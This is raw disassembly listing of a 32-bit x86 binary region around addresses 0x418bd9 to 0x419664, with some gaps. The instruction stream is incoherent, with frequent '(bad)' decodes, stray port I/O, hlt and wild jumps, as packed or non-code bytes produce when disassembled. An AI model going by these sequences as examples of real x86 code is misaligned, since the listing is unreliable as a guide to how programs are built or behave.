  418bd9:	xor    ch,bh
  418bdb:	mov    dh,0xff
  418bdd:	pop    edi
  418bde:	sar    BYTE PTR [ebp+0x3b],1
  418be1:	in     eax,0x7d
  418be3:	pop    ds
  418be4:	sbb    al,0x75
  418be6:	or     al,BYTE PTR [bx+di]
  418be9:	add    BYTE PTR [eax],al
  418beb:	add    DWORD PTR [eax],eax
  418bed:	add    BYTE PTR [esi-0x76],al
  418bf0:	fs push ds
  418bf2:	sbb    BYTE PTR [edx+eiz*1+0x3f],0x6e
  418bf7:	jge    0x418bea
  418bf9:	push   edi
  418bfa:	and    esi,DWORD PTR [esi]
  418bfc:	xlat   BYTE PTR ds:[ebx]
  418bfd:	mov    esp,0x3df0c7bd
  418c02:	adc    al,0x5a
  418c04:	mov    bh,0xfb
  418c06:	dec    ebx
  418c07:	dec    esi
  418c08:	jle    0x418c1b
  418c0a:	sub    ebx,DWORD PTR [edx-0x45]
  418c0d:	repz pop esp
  418c0f:	cmp    DWORD PTR [edx+0xc210dd5],ecx
  418c15:	jae    0x418bc5
  418c17:	inc    ebp
  418c18:	fisub  WORD PTR [ebx]
  418c1a:	std    
  418c1b:	aad    0x3a
  418c1d:	push   ss
  418c1e:	dec    ebp
  418c1f:	cmp    DWORD PTR [ecx+0x4848b67a],ecx
  418c25:	mov    edx,0x9bab5e2d
  418c2a:	push   0x6be6d93
  418c2f:	dec    edx
  418c30:	das    
  418c31:	fimul  DWORD PTR [edx]
  418c33:	fsubr  QWORD PTR [esi-0x61]
  418c36:	aas    
  418c37:	inc    edi
  418c38:	jecxz  0x418c24
  418c3a:	hlt    
  418c3b:	not    DWORD PTR [edx+0x7af5043d]
  418c41:	cmp    al,0x75
  418c43:	shr    ebp,1
  418c45:	pop    ecx
  418c46:	out    0x8e,eax
  418c48:	push   0xffffffc7
  418c4a:	pop    es
  418c4b:	scas   al,BYTE PTR es:[edi]
  418c4c:	dec    edx
  418c4d:	jns    0x418c8f
  418c4f:	jnp    0x418bec
  418c51:	imul   DWORD PTR [ecx-0x1f]
  418c54:	pop    esp
  418c55:	aad    0x9f
  418c57:	pop    ds
  418c58:	popa   
  418c59:	sub    al,0x1e
  418c5b:	fdivrp st(7),st
  418c5d:	loopne 0x418ca7
  418c5f:	push   cs
  418c60:	jnp    0x418c18
  418c62:	out    0xf7,al
  418c64:	mov    BYTE PTR [ebx+0x222611de],cl
  418c6a:	pop    es
  418c6b:	in     eax,0x4b
  418c6d:	jmp    0x3b685fbc
  418c72:	jo     0x418c8a
  418c74:	retf   0x8ca2
  418c77:	scas   eax,DWORD PTR es:[edi]
  418c78:	push   eax
  418c79:	sbb    al,0x7c
  418c7b:	aam    0xd4
  418c7d:	or     al,0x1b
  418c7f:	inc    ecx
  418c80:	test   DWORD PTR [ecx-0x53],0x5e8a0df0
  418c87:	adc    eax,0xdb74f1a3
  418c8c:	rcl    BYTE PTR [edx],1
  418c8e:	xor    BYTE PTR [ecx+0x4d],bh
  418c91:	or     ebx,DWORD PTR [ebx+0x51cd2aca]
  418c97:	sti    
  418c98:	jo     0x418cc4
  418c9a:	push   0xffffffa6
  418c9c:	mov    DWORD PTR [eax-0x48],edi
  418c9f:	shl    ah,0xc7
  418ca2:	bnd jg 0x418c36
  418ca5:	xchg   ebx,eax
  418ca6:	stos   BYTE PTR es:[edi],al
  418ca7:	stos   DWORD PTR es:[edi],eax
  418ca8:	nop
  418ca9:	stos   BYTE PTR es:[edi],al
  418caa:	pop    edx
  418cac:	pop    eax
  418cad:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  418caf:	out    dx,eax
  418cb0:	pop    esp
  418cb1:	mov    ebx,0xa08d2eb8
  418cb6:	mov    ds,WORD PTR [ecx+0x263b606e]
  418cbc:	jle    0x418c47
  418cbe:	mov    cl,0x9e
  418cc0:	and    eax,0xa82b3343
  418cc5:	mov    cl,0xb5
  418cc7:	add    DWORD PTR [ebp+0x70],ebx
  418cca:	and    DWORD PTR [edx],edx
  418ccc:	imul   esi,eax,0x2083881a
  418cd2:	outs   dx,BYTE PTR ds:[esi]
  418cd3:	and    DWORD PTR [ecx+eiz*4+0x5a709767],edx
  418cda:	lods   al,BYTE PTR ds:[esi]
  418cdb:	bound  ecx,QWORD PTR [edi+ebp*8+0x33f9d622]
  418ce2:	sub    edi,edx
  418ce4:	jb     0x418d38
  418ce6:	inc    esi
  418ce7:	xlat   BYTE PTR ds:[ebx]
  418ce8:	cmp    al,0xcb
  418cea:	test   BYTE PTR [eax+edi*8+0x58],ah
	...
  418d56:	sti    
  418d57:	inc    edx
  418d58:	out    dx,al
  418d59:	aas    
  418d5a:	(bad)  
  418d5b:	mov    edi,0x6a1ac6fb
  418d60:	(bad)  
  418d61:	rol    BYTE PTR [ebx+0x675dcfb8],cl
  418d67:	or     eax,DWORD PTR [ecx]
  418d69:	add    BYTE PTR [eax],al
  418d6b:	add    DWORD PTR [eax],eax
  418d6d:	add    BYTE PTR [ebx+0x64],bh
  418d70:	ss sar ecx,0x52
  418d74:	add    bh,cl
  418d76:	aaa    
  418d77:	popa   
  418d78:	push   ss
  418d79:	add    eax,0xf0125db0
  418d7e:	add    BYTE PTR [edi-0x80],al
  418d81:	xor    eax,0xcc7d7e67
  418d86:	aaa    
  418d87:	mov    eax,0xbeb731db
  418d8c:	or     di,si
  418d8f:	and    BYTE PTR [eax+0xb],0xbf
  418d93:	or     esp,DWORD PTR [ebx-0xbddb6ce]
  418d99:	dec    eax
  418d9a:	pop    eax
  418d9b:	fwait
  418d9c:	push   es
  418d9d:	or     al,0xba
  418d9f:	add    ah,al
  418da1:	sbb    ecx,DWORD PTR [ecx-0x4e42a985]
  418da7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418da8:	mov    al,ds:0x775e7bc0
  418dad:	xlat   BYTE PTR ds:[ebx]
  418dae:	xor    DWORD PTR [eax],edx
  418db0:	pop    ds
  418db1:	cmp    BYTE PTR [esp+ebx*8-0x44389e5f],dh
  418db8:	imul   ebp,ecx,0xffffff97
  418dbb:	xlat   BYTE PTR ds:[ebx]
  418dbc:	int3   
  418dbd:	aaa    
  418dbe:	stc    
  418dbf:	je     0x418e3e
  418dc1:	ss add dh,dl
  418dc4:	dec    ebx
  418dc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dc6:	ins    BYTE PTR es:[edi],dx
  418dc7:	jp     0x418e3f
  418dc9:	jmp    0x418d55
  418dcb:	sbb    esi,DWORD PTR [edx]
  418dcd:	mov    bh,0x79
  418dcf:	dec    edi
  418dd0:	push   ss
  418dd1:	or     edx,DWORD PTR [edx+eiz*8+0x32]
  418dd5:	jbe    0x418d7e
  418dd7:	pusha  
  418dd8:	pop    esi
  418dd9:	mov    cl,0x22
  418ddb:	cmc    
  418ddc:	cmp    edx,DWORD PTR [esi+eiz*1+0x6805bf8c]
  418de3:	repnz mov esp,0x7637c57d
  418de9:	rcl    DWORD PTR [ebp+ebx*4+0x57],0x69
  418dee:	repnz imul esi,DWORD PTR [eax],0xffffffab
  418df2:	test   al,0xa3
  418df4:	call   0xf7fffafe
  418df9:	adc    DWORD PTR [ebp-0x26],esi
  418dfc:	xor    cl,BYTE PTR [ebp+0xd]
  418dff:	shr    DWORD PTR [edi+0x41f65906],0x26
  418e06:	push   ebx
  418e07:	stos   BYTE PTR es:[edi],al
  418e08:	pop    ss
  418e09:	or     eax,0x9d834318
  418e0e:	pushf  
  418e0f:	xor    ecx,ebp
  418e11:	mov    eax,0xdd014c6c
  418e16:	pop    es
  418e17:	(bad)  
  418e18:	(bad)  
  418e19:	adc    bh,al
  418e1b:	xchg   edx,eax
  418e1c:	out    dx,al
  418e1d:	or     BYTE PTR [ecx],ah
  418e1f:	inc    ebp
  418e20:	dec    edi
  418e21:	push   esi
  418e22:	xchg   edi,eax
  418e23:	es xor edx,ecx
  418e26:	(bad)  
  418e27:	cld    
  418e28:	sbb    al,0xc6
  418e2a:	xchg   edx,eax
  418e2b:	dec    ecx
  418e2c:	dec    edx
  418e2d:	mov    ds:0xfe3b15e6,eax
  418e32:	pusha  
  418e33:	mov    eax,0xcce49589
  418e38:	xlat   BYTE PTR ds:[ebx]
  418e39:	popf   
  418e3a:	les    esi,FWORD PTR [ebp+0x2d]
  418e3d:	lods   eax,DWORD PTR ds:[esi]
  418e3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e3f:	icebp  
  418e40:	test   al,0x30
  418e42:	lahf   
  418e43:	iret   
  418e44:	pusha  
  418e45:	rcr    DWORD PTR [ebp-0x42926ff9],1
  418e4b:	shl    ch,cl
  418e4d:	popa   
  418e4e:	xchg   edi,eax
  418e4f:	and    eax,0x6b00c65f
  418e54:	add    BYTE PTR [ecx-0x3a],cl
  418e57:	(bad)  
  418e58:	bound  edx,QWORD PTR [eax+eax*8+0x3d7f2ffa]
  418e5f:	cmp    eax,0xc78fb410
  418e64:	or     ch,BYTE PTR [ebx+0x2e]
  418e67:	sbb    al,0xa5
  418e69:	sti    
  418e6a:	imul   edi,ecx,0xe464
	...
  418ed4:	add    BYTE PTR [eax],al
  418ed6:	push   cs
  418ed7:	bnd call 0xde7c8b0d
  418edd:	dec    dl
  418edf:	leave  
  418ee0:	and    ah,BYTE PTR [edx+0x2e]
  418ee3:	cdq    
  418ee4:	out    dx,eax
  418ee5:	xor    ah,BYTE PTR [edi+0xc]
  418ee8:	add    DWORD PTR [eax],eax
  418eea:	add    BYTE PTR [ecx],al
  418eec:	add    BYTE PTR [eax],al
  418eee:	test   al,0x45
  418ef0:	js     0x418f3c
  418ef2:	mov    ebp,0x4022cb19
  418ef7:	xor    ecx,edi
  418ef9:	mov    al,0x3e
  418efb:	inc    ecx
  418efc:	stos   BYTE PTR es:[edi],al
  418efd:	fcom   DWORD PTR [ebx+0x32f05f32]
  418f03:	addr16 pop ebp
  418f05:	shl    ecx,cl
  418f07:	xor    ecx,esp
  418f09:	enter  0x320b,0x36
  418f0d:	pushf  
  418f0e:	cmp    eax,0x180b7477
  418f13:	or     al,0xb7
  418f15:	retf   
  418f16:	pushf  
  418f17:	push   ecx
  418f18:	stos   BYTE PTR es:[edi],al
  418f19:	js     0x418ee1
  418f1b:	retf   
  418f1c:	add    DWORD PTR [eax-0x2d],0xb
  418f20:	jl     0x418f6c
  418f22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f23:	push   ss
  418f24:	js     0x418f52
  418f26:	mov    dl,0xc7
  418f28:	icebp  
  418f29:	in     eax,dx
  418f2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f2b:	daa    
  418f2c:	jns    0x418f6e
  418f2e:	loop   0x418ef3
  418f30:	and    al,0xdb
  418f32:	div    DWORD PTR [ebp+0x1b]
  418f35:	fdivr  st,st(6)
  418f37:	scas   al,BYTE PTR es:[edi]
  418f38:	pop    ds
  418f39:	sub    DWORD PTR [eax*8+0x41cae37f],esp
  418f40:	mov    eax,0x56b02b27
  418f45:	fs gs dec esi
  418f48:	fstp   QWORD PTR [eax-0x267a198d]
  418f4e:	add    ebp,0xffffffe9
  418f51:	pop    edx
  418f52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f53:	dec    ebp
  418f54:	jb     0x418f36
  418f56:	and    esi,ecx
  418f58:	push   0xffffffb2
  418f5a:	adc    DWORD PTR [edx+0x368f95e4],ebx
  418f60:	cdq    
  418f61:	mov    esi,0xb1da52ca
  418f66:	jbe    0x418fcf
  418f68:	push   es
  418f69:	cdq    
  418f6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f6b:	aas    
  418f6c:	outs   dx,WORD PTR ds:[esi]
  418f6e:	cmp    eax,DWORD PTR ds:0xf6fe94c1
  418f74:	pop    edi
  418f75:	jmp    DWORD PTR [eax-0x58761b50]
  418f7b:	adc    eax,0xdaaeeaaa
  418f80:	pushf  
  418f81:	mov    ds:0x8ac82d06,al
  418f86:	int3   
  418f87:	(bad)  
  418f88:	mov    al,0x98
  418f8a:	sub    bh,ch
  418f8c:	push   0x2e
  418f8e:	ins    BYTE PTR es:[edi],dx
  418f8f:	add    esi,DWORD PTR [edx+0x8b65dd1]
  418f95:	(bad)  
  418f96:	imul   ebp,DWORD PTR [esi+0x537cb146],0x1e
  418f9d:	push   ebp
  418f9e:	enter  0x166f,0x28
  418fa2:	icebp  
  418fa3:	mov    ecx,0x987f3858
  418fa8:	dec    ecx
  418fa9:	mov    ebx,DWORD PTR [ecx]
  418fab:	add    ecx,ecx
  418fad:	outs   dx,DWORD PTR ds:[esi]
  418fae:	push   es
  418faf:	(bad)  
  418fb0:	mov    bl,0x89
  418fb2:	jmp    0x295029b1
  418fb7:	or     DWORD PTR [ebx],ebx
  418fb9:	rcr    edi,0x52
  418fbc:	mov    al,ds:0xe7dcc8cd
  418fc1:	inc    ecx
  418fc2:	jle    0x418f91
  418fc4:	std    
  418fc5:	sti    
  418fc6:	sub    DWORD PTR [esp+ecx*4],esp
  418fc9:	data16 repnz sub al,0x74
  418fcd:	mov    ebx,0x19cead42
  418fd2:	cmp    al,0x28
  418fd4:	dec    esp
  418fd5:	mov    ch,0x6c
  418fd7:	or     eax,0xd2b461be
  418fdc:	out    dx,al
  418fdd:	jl     0x418fce
  418fdf:	test   eax,0x80f0db15
  418fe4:	jbe    0x418f94
  418fe6:	fild   QWORD PTR [edx]
  418fe8:	cmp    BYTE PTR [edi+0x1eb4684c],dh
	...
  419056:	sbb    al,0x97
  419058:	in     al,0x47
  41905a:	out    dx,eax
  41905b:	ja     0x41901c
  41905d:	fild   WORD PTR [ecx-0x69150e59]
  419063:	xchg   ebx,eax
  419064:	xchg   esp,eax
  419065:	or     BYTE PTR [edi+0xd],ah
  419068:	add    DWORD PTR [eax],eax
  41906a:	add    BYTE PTR [ecx],al
  41906c:	add    BYTE PTR [eax],al
  41906e:	and    ch,bh
  419070:	stos   BYTE PTR es:[edi],al
  419071:	aad    0x79
  419073:	add    al,0x3e
  419075:	push   0x4b
  419077:	pop    eax
  419078:	pop    edx
  419079:	(bad)  
  41907a:	push   0x78
  41907c:	adc    al,0xeb
  41907e:	mov    BYTE PTR [ecx+ebp*2+0x6f24dd6d],bl
  419085:	push   0xffffff9a
  419087:	sub    DWORD PTR [ebx+0x77450080],edx
  41908d:	mov    ds:0x18dd515d,al
  419092:	mov    ss,WORD PTR [edx+0x3e]
  419095:	inc    ebx
  419096:	jbe    0x419049
  419098:	mov    ebx,DWORD PTR [ebp-0x5a]
  41909b:	ds out 0xa4,al
  41909e:	cli    
  41909f:	sahf   
  4190a0:	jb     0x419102
  4190a2:	lahf   
  4190a3:	pop    es
  4190a4:	daa    
  4190a5:	mov    ch,0xe0
  4190a7:	adc    DWORD PTR [eax],0xdf983b88
  4190ad:	push   cs
  4190ae:	dec    esp
  4190af:	(bad)  
  4190b0:	cdq    
  4190b1:	cmc    
  4190b2:	(bad)  
  4190b3:	jle    0x419058
  4190b5:	cmp    bh,ch
  4190b7:	div    BYTE PTR [ebp-0x4274c902]
  4190bd:	sahf   
  4190be:	and    eax,0x4fb3e4c5
  4190c3:	pop    ecx
  4190c4:	mov    esp,0x388ea3ac
  4190c9:	mov    ebx,0x6933d9c5
  4190ce:	mov    esp,0x758d60de
  4190d3:	scas   al,BYTE PTR es:[edi]
  4190d4:	jns    0x419146
  4190d6:	int    0x8e
  4190d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190d9:	outs   dx,DWORD PTR ds:[esi]
  4190da:	sbb    ecx,DWORD PTR [di]
  4190dd:	push   es
  4190de:	aad    0x96
  4190e0:	jl     0x419062
  4190e2:	shl    DWORD PTR [ebx-0x595b7b10],0x3b
  4190e9:	dec    edx
  4190ea:	scas   al,BYTE PTR es:[edi]
  4190eb:	add    ch,BYTE PTR [ebx+0x58]
  4190ee:	jmp    0x752efe88
  4190f3:	sahf   
  4190f4:	adc    ecx,eax
  4190f6:	add    DWORD PTR [edi+0x21],ecx
  4190f9:	jno    0x41908c
  4190fb:	fisub  WORD PTR [ebp-0x630f8d02]
  419101:	jp     0x419119
  419103:	inc    eax
  419104:	mov    dh,0x8d
  419106:	out    dx,al
  419107:	out    dx,eax
  419108:	mov    ebp,0x2f6dc122
  41910d:	data16 cld 
  41910f:	mov    ah,0x24
  419111:	sbb    BYTE PTR [ecx-0x6a],0xbc
  419115:	adc    BYTE PTR [esi-0x1e508612],0xe6
  41911c:	pushf  
  41911d:	xor    al,0xda
  41911f:	jge    0x4190f4
  419121:	push   ss
  419122:	sbb    edi,DWORD PTR [ecx-0x47]
  419125:	pop    ecx
  419126:	hlt    
  419127:	aas    
  419128:	or     eax,0x42165391
  41912d:	in     eax,dx
  41912e:	into   
  41912f:	push   ds
  419130:	mov    esi,0x2da1173c
  419135:	mov    ds:0x4f094f71,al
  41913a:	pop    edx
  41913b:	rcl    bh,1
  41913d:	clc    
  41913e:	sbb    bh,BYTE PTR [ebx]
  419140:	jl     0x419104
  419142:	es dec ebx
  419144:	test   DWORD PTR [edi],eax
  419146:	jmp    0x11c71a9e
  41914b:	mov    ds:0x644609c1,eax
  419150:	daa    
  419151:	das    
  419152:	shl    BYTE PTR [eax-0x30a2e1c9],cl
  419158:	sbb    eax,0x68b9d995
  41915d:	push   edi
  41915e:	ins    BYTE PTR es:[edi],dx
  41915f:	aam    0xd7
  419161:	lock sbb esi,ebx
  419164:	idiv   DWORD PTR [ebx+0x31]
  419167:	pop    eax
  419168:	mov    al,0x66
  41916a:	sbb    ch,BYTE PTR [edx]
  41916c:	jne    0x4191bb
	...
  4191d6:	scas   eax,DWORD PTR es:[edi]
  4191d7:	test   DWORD PTR [esi-0xa441be],ebx
  4191dd:	in     eax,dx
  4191de:	inc    esi
  4191df:	push   0x4d
  4191e1:	or     ch,BYTE PTR [edi+0x6742dcd2]
  4191e7:	push   cs
  4191e8:	add    DWORD PTR [eax],eax
  4191ea:	add    BYTE PTR [ecx],al
  4191ec:	add    BYTE PTR [eax],al
  4191ee:	imul   esi,eax,0x2c
  4191f1:	dec    edx
  4191f2:	sub    BYTE PTR [edx-0x62],ch
  4191f5:	sub    dl,al
  4191f7:	mov    ds:0x949469b2,eax
  4191fc:	mov    edi,0xfe9ade39
  419201:	jmp    0xf85e275a
  419206:	jmp    0x9c2ea1f
  41920b:	jae    0x4191df
  41920d:	or     eax,0x21651ac4
  419212:	add    eax,0xc6c4e7c0
  419217:	add    al,BYTE PTR [ebp+0x75]
  41921a:	fxch   st(1)
  41921c:	fwait
  41921d:	sbb    DWORD PTR ds:0x62d26ce4,edx
  419223:	cmp    eax,0xa94609e8
  419228:	gs mov al,0x6b
  41922b:	xchg   DWORD PTR [eax+0x788e1e0c],edx
  419231:	pop    es
  419232:	daa    
  419233:	hlt    
  419234:	cmc    
  419235:	add    eax,0x47b0270f
  41923a:	jp     0x4192ad
  41923c:	(bad)  
  41923d:	retf   
  41923e:	fistp  QWORD PTR [ecx+0x345d5a48]
  419244:	cmp    bl,BYTE PTR [esi-0x6a7b0c36]
  41924a:	enter  0x8339,0x2e
  41924e:	iret   
  41924f:	sub    BYTE PTR [edx],al
  419251:	cld    
  419252:	pop    edx
  419253:	sub    eax,0x4e3564ea
  419258:	inc    ecx
  419259:	test   al,0x95
  41925b:	enter  0x8913,0x19
  41925f:	adc    ch,bh
  419261:	mov    al,0xf1
  419263:	sub    esi,DWORD PTR [ebp-0x7d]
  419266:	fisubr DWORD PTR [ecx-0x71acc5a0]
  41926c:	mov    edi,0x120eb5a0
  419271:	(bad)  
  419273:	xchg   ebx,eax
  419274:	icebp  
  419275:	xor    al,0xfe
  419277:	bound  ebp,QWORD PTR [eax]
  419279:	xchg   esi,eax
  41927a:	sub    esi,ebp
  41927c:	(bad)  
  419280:	(bad)  
  419282:	mov    ah,bh
  419284:	add    DWORD PTR [ebp+0x22],0xffffff80
  419288:	or     esi,DWORD PTR [edi]
  41928a:	pushf  
  41928b:	cmp    BYTE PTR [si-0x4ea6],al
  419290:	(bad)
  419293:	xchg   edx,eax
  419294:	mov    ah,BYTE PTR [esp+esi*2-0xbfc9335]
  41929b:	(bad)  
  41929c:	mov    ds:0xf2eaafb9,eax
  4192a1:	cmp    esi,DWORD PTR [esi]
  4192a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192a4:	cli    
  4192a5:	and    dh,BYTE PTR [ecx-0x4fc552b8]
  4192ab:	and    BYTE PTR [ecx-0x5cf764a0],al
  4192b1:	fdiv   DWORD PTR ds:0x1bd6af84
  4192b7:	les    esp,FWORD PTR [edx-0x54cb159c]
  4192bd:	clc    
  4192be:	mov    ah,0x75
  4192c0:	aas    
  4192c1:	dec    ebp
  4192c2:	mov    DWORD PTR [ecx+0x58fe4266],ebx
  4192c8:	push   edi
  4192c9:	dec    esp
  4192ca:	push   ds
  4192cb:	jno    0x4192cd
  4192cd:	hlt    
  4192ce:	(bad)  [ebp+0x1c]
  4192d1:	clc    
  4192d2:	add    bl,ch
  4192d4:	lea    edi,[edi-0x25c6c507]
  4192da:	ins    BYTE PTR es:[edi],dx
  4192db:	scas   eax,DWORD PTR es:[edi]
  4192dc:	sbb    al,0x72
  4192de:	test   BYTE PTR [esi+0x77d45ccd],ch
  4192e4:	rol    ch,0xdd
  4192e7:	jbe    0x41929e
  4192e9:	and    dl,BYTE PTR [ebx]
  4192eb:	dec    ecx
  4192ec:	sbb    eax,0x1b
	...
  419355:	add    BYTE PTR [eax-0xcc4519],ah
  41935b:	jg     0x419306
  41935d:	neg    eax
  41935f:	pop    ss
  419360:	daa    
  419361:	inc    edi
  419362:	fnstsw WORD PTR [eax+ecx*4-0x80]
  419366:	sgdtd  [bx+si]
  41936a:	add    BYTE PTR [ecx],al
  41936c:	add    BYTE PTR [eax],al
  41936e:	xchg   DWORD PTR [edi],esi
  419370:	lods   al,BYTE PTR ds:[esi]
  419371:	repnz adc BYTE PTR [eax],dl
  419374:	mov    al,ds:0x9c5cd232
  419379:	in     eax,dx
  41937a:	sti    
  41937b:	add    esp,eax
  41937d:	enter  0x645,0x79
  419381:	jmp    0x4193f6
  419383:	inc    ebx
  419384:	sbb    DWORD PTR [edi],edx
  419386:	popa   
  419387:	ins    BYTE PTR es:[edi],dx
  419388:	arpl   WORD PTR [eax-0x553370c3],dx
  41938e:	sub    esp,eax
  419390:	mov    eax,0xd39efd36
  419395:	test   DWORD PTR [esi],0x31180003
  41939b:	(bad)  [esi]
  41939d:	les    eax,FWORD PTR [eax+0x7680a681]
  4193a3:	mov    eax,?
  4193a5:	out    dx,al
  4193a6:	pusha  
  4193a7:	loop   0x41939f
  4193a9:	fadd   QWORD PTR [ebx]
  4193ab:	ins    BYTE PTR es:[edi],dx
  4193ac:	jae    0x419396
  4193ae:	jne    0x419374
  4193b0:	ror    ch,cl
  4193b2:	adc    dl,BYTE PTR [ebx+0xa19ed43]
  4193b8:	dec    edx
  4193b9:	loope  0x4193ea
  4193bb:	xchg   bh,cl
  4193bd:	mov    edx,0xb4efc354
  4193c2:	(bad)  
  4193c3:	or     esp,edi
  4193c5:	push   ebx
  4193c6:	mov    ebx,es
  4193c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193c9:	jmp    0x69bd:0x3583ec0a
  4193d0:	rcl    DWORD PTR [esi+0x6],cl
  4193d3:	mov    edi,0x5c67ee6d
  4193d8:	jae    0x419381
  4193da:	or     bl,0x7d
  4193dd:	aam    0xf2
  4193df:	cwde   
  4193e0:	rcr    BYTE PTR [edx-0x296b51c4],cl
  4193e6:	push   0x52
  4193e8:	in     eax,dx
  4193e9:	outs   dx,BYTE PTR ds:[esi]
  4193ea:	icebp  
  4193eb:	jae    0x4193ff
  4193ed:	dec    edx
  4193ee:	xchg   esp,eax
  4193ef:	data16 arpl WORD PTR [edx+eiz*8-0x7d],bp
  4193f4:	sub    DWORD PTR [eax],0xe44331a7
  4193fa:	cmp    ebp,DWORD PTR [eax+0x5849a823]
  419400:	xchg   ebx,eax
  419401:	mov    ebx,ebp
  419403:	sub    BYTE PTR [edx],0xd9
  419406:	lea    ebx,[eax]
  419408:	pop    ebp
  419409:	rol    bl,0xcc
  41940c:	popf   
  41940d:	mov    edi,0x2b5c6144
  419412:	adc    DWORD PTR [ebp+0x441b4ae8],ecx
  419418:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41941a:	loope  0x4193a8
  41941c:	mov    ebx,0x95dee1da
  419421:	ret    0x2959
  419424:	test   bl,0xb
  419427:	mul    DWORD PTR [eax-0x623b2e34]
  41942d:	and    eax,0x4a26872f
  419432:	sahf   
  419433:	jmp    0xe1a41fce
  419438:	sbb    eax,0x28305e3b
  41943d:	pop    ds
  41943e:	shl    BYTE PTR [ebp-0x4],cl
  419441:	dec    edi
  419442:	pop    esi
  419443:	dec    edx
  419444:	push   cs
  419445:	mov    fs,WORD PTR [ebx+0x2]
  419448:	jmp    0x41946b
  41944a:	sbb    eax,DWORD PTR [edi-0x3015e55c]
  419450:	add    esp,DWORD PTR [edx]
  419452:	mov    al,ds:0x9c0153a6
  419457:	imul   al
  419459:	ds adc al,0xc0
  41945c:	inc    edx
  41945d:	xchg   edi,eax
  41945e:	fstp   TBYTE PTR ds:0xa92eaa6b
  419464:	fld    DWORD PTR [edx+0x1915251a]
  41946a:	adc    DWORD PTR [eax+0x5ec6],0x0
	...
  4194d5:	add    BYTE PTR ds:0xed3a6998,bh
  4194db:	sti    
  4194dc:	jg     0x41947d
  4194de:	cmp    ebx,esi
  4194e0:	je     0x4194a8
  4194e2:	mov    ecx,0x6713054d
  4194e7:	adc    BYTE PTR [ecx],al
  4194e9:	add    BYTE PTR [eax],al
  4194eb:	add    DWORD PTR [eax],eax
  4194ed:	add    BYTE PTR [ebx-0x6a1ed7e2],bl
  4194f3:	dec    esp
  4194f4:	int    0x29
  4194f6:	push   esi
  4194f7:	jno    0x419544
  4194f9:	jne    0x4194e2
  4194fb:	lock out 0x12,al
  4194fe:	fnstcw WORD PTR [ecx-0x77]
  419501:	shr    DWORD PTR [ebp-0x3c333706],0xa1
  419508:	retf   0xb918
  41950b:	not    DWORD PTR [esi-0x7822b166]
  419511:	scas   eax,DWORD PTR es:[edi]
  419512:	adc    ebp,DWORD PTR [esp+ebx*1-0x61ea61c6]
  419519:	addr16 push esi
  41951b:	xchg   esi,eax
  41951c:	call   0x2d48:0xa072b616
  419523:	pop    ss
  419524:	adc    BYTE PTR [ebp-0x64],0x2c
  419528:	scas   eax,DWORD PTR es:[edi]
  419529:	jae    0x41954f
  41952b:	std    
  41952c:	retf   
  41952d:	je     0x41954e
  41952f:	scas   al,BYTE PTR es:[edi]
  419530:	in     eax,dx
  419531:	ret    
  419532:	jae    0x4194dd
  419534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419535:	pop    ebp
  419536:	or     ebp,DWORD PTR [edi+eiz*4+0x359be62]
  41953d:	out    dx,eax
  41953e:	jae    0x419504
  419540:	mov    DWORD PTR [eax],ebx
  419542:	mov    ds:0xf66c4396,al
  419547:	daa    
  419548:	stos   BYTE PTR es:[edi],al
  419549:	pop    ebx
  41954a:	lock pop eax
  41954c:	push   ss
  41954d:	(bad)  
  41954e:	cmp    eax,0x4621f9a6
  419553:	nop
  419554:	ja     0x4194eb
  419556:	jno    0x41953f
  419558:	fimul  DWORD PTR [esi+0xdb4cc8]
  41955e:	ret    
  41955f:	mov    WORD PTR [edx+0x42efbbb3],?
  419565:	inc    ecx
  419566:	(bad)  
  419567:	lea    esp,[ecx-0x49cf2233]
  41956d:	sub    ebx,DWORD PTR [edx]
  41956f:	xchg   BYTE PTR [eax],ch
  419571:	mov    DWORD PTR [esi+0x22],esp
  419574:	sbb    edx,edx
  419576:	pop    esi
  419577:	mov    esp,0x6ad4f65d
  41957c:	in     al,dx
  41957d:	adc    DWORD PTR [ecx+0xe8fc704],0xffffffd7
  419584:	sbb    BYTE PTR [ecx+0x1a48315a],dl
  41958a:	adc    dl,0x16
  41958d:	add    DWORD PTR [ebp-0x6aeb1ad0],ebx
  419593:	pop    esi
  419594:	sbb    bl,BYTE PTR [eax]
  419596:	add    ch,dl
  419598:	mov    eax,ds:0x32625642
  41959d:	shr    ebp,1
  41959f:	pop    ebx
  4195a0:	jb     0x419572
  4195a2:	add    esp,DWORD PTR [eax+0x4e]
  4195a5:	adc    eax,0x3b38bee5
  4195aa:	mov    al,dl
  4195ac:	je     0x419608
  4195ae:	push   esp
  4195af:	pusha  
  4195b0:	in     al,dx
  4195b1:	or     eax,0x81442995
  4195b6:	hlt    
  4195b7:	or     DWORD PTR [ecx+0x3b],esp
  4195ba:	mov    eax,0xbbd2935c
  4195bf:	xchg   edx,eax
  4195c0:	adc    BYTE PTR [edi-0x2f078830],dh
  4195c6:	jp     0x4195c6
  4195c8:	(bad)  [ebp-0x4984bb17]
  4195ce:	add    BYTE PTR [esi+0x43],dh
  4195d1:	inc    ebx
  4195d2:	xor    dl,BYTE PTR [ebx-0x16]
  4195d5:	imul   ebp,DWORD PTR [ecx],0xd581cc8f
  4195db:	and    BYTE PTR [ebx+ebx*2],cl
  4195de:	jo     0x41965e
  4195e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195e2:	enter  0x6a98,0x98
  4195e6:	mov    dh,0x89
  4195e8:	push   ebx
  4195e9:	pop    edx
  4195ea:	sbb    eax,0xc52747
	...
  419653:	add    BYTE PTR [eax],al
  419655:	add    BYTE PTR [edi-0x9d722c],ch
  41965b:	jnp    0x41964c
  41965d:	fstp   st(1)
  41965f:	fcomp  QWORD PTR [ebx+0x2f]
  419662:	adc    DWORD PTR [ecx],edi
  419664:	mov    esp,DWORD PTR ds:[edi+0x11]
